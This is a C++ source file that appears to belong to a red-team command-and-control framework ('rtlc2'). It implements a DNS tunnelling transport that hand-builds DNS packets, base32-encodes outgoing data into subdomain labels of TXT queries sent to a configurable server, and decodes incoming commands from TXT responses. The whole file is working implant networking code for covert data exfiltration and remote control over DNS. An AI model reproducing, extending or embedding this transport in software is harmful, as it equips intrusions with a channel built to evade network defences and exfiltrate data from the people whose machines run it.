// DNS Transport - Encode C2 data in DNS queries and responses
// Uses TXT records for receiving data, subdomain labels for sending
#include "transport.h"
#include <cstring>
#include <cstdlib>

#ifdef RTLC2_WINDOWS
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define CLOSESOCKET closesocket
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <openssl/rand.h>
#define CLOSESOCKET close
#endif

namespace rtlc2 {
namespace transport {

static const char BASE32_CHARS[] = "abcdefghijklmnopqrstuvwxyz234567";

DNSTransport::DNSTransport(const std::string& domain, const std::string& dns_server, int dns_port)
    : domain_(domain), dns_server_(dns_server), dns_port_(dns_port), sock_(-1) {}

DNSTransport::~DNSTransport() {
    Disconnect();
}

bool DNSTransport::Connect() {
#ifdef RTLC2_WINDOWS
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    sock_ = (int)socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock_ < 0) return false;

    connected_ = true;
    return true;
}

void DNSTransport::Disconnect() {
    if (sock_ >= 0) {
        CLOSESOCKET(sock_);
        sock_ = -1;
    }
    connected_ = false;
}

bool DNSTransport::IsConnected() const {
    return connected_ && sock_ >= 0;
}

std::string DNSTransport::Base32Encode(const std::vector<uint8_t>& data) {
    std::string result;
    int bits = 0;
    int buffer = 0;

    for (uint8_t byte : data) {
        buffer = (buffer << 8) | byte;
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            result += BASE32_CHARS[(buffer >> bits) & 0x1F];
        }
    }
    if (bits > 0) {
        result += BASE32_CHARS[(buffer << (5 - bits)) & 0x1F];
    }
    return result;
}

std::vector<uint8_t> DNSTransport::Base32Decode(const std::string& encoded) {
    std::vector<uint8_t> result;
    int bits = 0;
    int buffer = 0;

    for (char c : encoded) {
        int val = -1;
        if (c >= 'a' && c <= 'z') val = c - 'a';
        else if (c >= '2' && c <= '7') val = c - '2' + 26;
        if (val < 0) continue;

        buffer = (buffer << 5) | val;
        bits += 5;
        if (bits >= 8) {
            bits -= 8;
            result.push_back((uint8_t)(buffer >> bits));
        }
    }
    return result;
}

// Build a DNS query packet
std::vector<uint8_t> DNSTransport::BuildDNSQuery(const std::string& subdomain, uint16_t type) {
    std::vector<uint8_t> packet;

    // Transaction ID (crypto-random to prevent DNS cache poisoning)
    uint16_t txid = 0;
#ifdef RTLC2_WINDOWS
    // BCrypt crypto RNG (Windows)
    typedef long (WINAPI *BCryptGenRandom_t)(void*, unsigned char*, unsigned long, unsigned long);
    HMODULE hBcrypt = LoadLibraryA("bcrypt.dll");
    if (hBcrypt) {
        auto pBCryptGenRandom = (BCryptGenRandom_t)GetProcAddress(hBcrypt, "BCryptGenRandom");
        if (pBCryptGenRandom) {
            pBCryptGenRandom(NULL, (unsigned char*)&txid, sizeof(txid), 0x00000002 /*BCRYPT_USE_SYSTEM_PREFERRED_RNG*/);
        }
        FreeLibrary(hBcrypt);
    }
    if (txid == 0) txid = (uint16_t)(rand() & 0xFFFF); // fallback
#else
    // OpenSSL crypto RNG (POSIX - already linked via cmake)
    if (RAND_bytes((unsigned char*)&txid, sizeof(txid)) != 1) {
        txid = (uint16_t)(rand() & 0xFFFF); // fallback
    }
#endif
    packet.push_back((uint8_t)(txid >> 8));
    packet.push_back((uint8_t)(txid & 0xFF));

    // Flags: standard query, recursion desired
    packet.push_back(0x01); // QR=0, OPCODE=0, RD=1
    packet.push_back(0x00);

    // Questions: 1
    packet.push_back(0x00); packet.push_back(0x01);
    // Answers: 0
    packet.push_back(0x00); packet.push_back(0x00);
    // Authority: 0
    packet.push_back(0x00); packet.push_back(0x00);
    // Additional: 0
    packet.push_back(0x00); packet.push_back(0x00);

    // QNAME: subdomain.domain
    std::string fullDomain = subdomain + "." + domain_;
    size_t pos = 0;
    while (pos < fullDomain.size()) {
        size_t dot = fullDomain.find('.', pos);
        if (dot == std::string::npos) dot = fullDomain.size();
        size_t labelLen = dot - pos;
        if (labelLen > 63) labelLen = 63; // DNS label max
        packet.push_back((uint8_t)labelLen);
        for (size_t i = 0; i < labelLen; i++) {
            packet.push_back((uint8_t)fullDomain[pos + i]);
        }
        pos = dot + 1;
    }
    packet.push_back(0x00); // Root label

    // QTYPE
    packet.push_back((uint8_t)(type >> 8));
    packet.push_back((uint8_t)(type & 0xFF));

    // QCLASS: IN
    packet.push_back(0x00); packet.push_back(0x01);

    return packet;
}

// Parse TXT records from DNS response
std::vector<uint8_t> DNSTransport::ParseDNSTXTResponse(const std::vector<uint8_t>& response) {
    if (response.size() < 12) return {};

    // Skip header
    uint16_t qdcount = (response[4] << 8) | response[5];
    uint16_t ancount = (response[6] << 8) | response[7];

    // Skip question section
    size_t offset = 12;
    for (int q = 0; q < qdcount && offset < response.size(); q++) {
        while (offset < response.size() && response[offset] != 0) {
            if ((response[offset] & 0xC0) == 0xC0) {
                offset += 2; break;
            }
            offset += response[offset] + 1;
        }
        if (offset < response.size() && response[offset] == 0) offset++;
        offset += 4; // QTYPE + QCLASS
    }

    // Parse answer section
    std::vector<uint8_t> result;
    for (int a = 0; a < ancount && offset < response.size(); a++) {
        // Skip name (possibly compressed)
        if ((response[offset] & 0xC0) == 0xC0) {
            offset += 2;
        } else {
            while (offset < response.size() && response[offset] != 0)
                offset += response[offset] + 1;
            offset++; // skip null
        }

        if (offset + 10 > response.size()) break;

        uint16_t rtype = (response[offset] << 8) | response[offset + 1];
        offset += 2; // type
        offset += 2; // class
        offset += 4; // TTL
        uint16_t rdlength = (response[offset] << 8) | response[offset + 1];
        offset += 2;

        if (rtype == 16) { // TXT record
            size_t end = offset + rdlength;
            while (offset < end && offset < response.size()) {
                uint8_t txtLen = response[offset++];
                for (uint8_t i = 0; i < txtLen && offset < response.size(); i++) {
                    result.push_back(response[offset++]);
                }
            }
        } else {
            offset += rdlength;
        }
    }

    return result;
}

// Send data encoded as DNS subdomain labels
Response DNSTransport::Send(const std::vector<uint8_t>& data) {
    Response resp = {};
    if (sock_ < 0) {
        resp.error = "Not connected";
        return resp;
    }

    // Encode data as base32 and split into DNS labels (max 63 chars each)
    std::string encoded = Base32Encode(data);

    // Split into chunks of 63 chars (DNS label limit)
    std::string subdomain;
    for (size_t i = 0; i < encoded.size(); i += 63) {
        if (!subdomain.empty()) subdomain += ".";
        subdomain += encoded.substr(i, 63);
    }

    // Build and send DNS query
    std::vector<uint8_t> query = BuildDNSQuery(subdomain, 16); // TXT query

    struct sockaddr_in dnsAddr = {};
    dnsAddr.sin_family = AF_INET;
    dnsAddr.sin_port = htons((uint16_t)dns_port_);
    inet_pton(AF_INET, dns_server_.c_str(), &dnsAddr.sin_addr);

    int sent = sendto(sock_, (const char*)query.data(), (int)query.size(), 0,
                      (struct sockaddr*)&dnsAddr, sizeof(dnsAddr));
    if (sent <= 0) {
        resp.error = "sendto failed";
        return resp;
    }

    resp.success = true;
    resp.status_code = 200;
    return resp;
}

// Receive data from DNS TXT response
Response DNSTransport::Receive() {
    Response resp = {};
    if (sock_ < 0) {
        resp.error = "Not connected";
        return resp;
    }

    // Wait for response
    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(sock_, &readfds);
    struct timeval tv = { 5, 0 }; // 5 second timeout

    if (select(sock_ + 1, &readfds, NULL, NULL, &tv) <= 0) {
        resp.error = "DNS response timeout";
        return resp;
    }

    uint8_t buf[65535];
    struct sockaddr_in from;
    socklen_t fromLen = sizeof(from);
    int received = recvfrom(sock_, (char*)buf, sizeof(buf), 0,
                            (struct sockaddr*)&from, &fromLen);
    if (received <= 0) {
        resp.error = "recvfrom failed";
        return resp;
    }

    std::vector<uint8_t> rawResp(buf, buf + received);
    std::vector<uint8_t> txtData = ParseDNSTXTResponse(rawResp);

    if (txtData.empty()) {
        resp.error = "No TXT data in response";
        return resp;
    }

    // Base32 decode the TXT data
    std::string txtStr(txtData.begin(), txtData.end());
    resp.body = Base32Decode(txtStr);
    resp.success = true;
    resp.status_code = 200;
    return resp;
}

} // namespace transport
} // namespace rtlc2
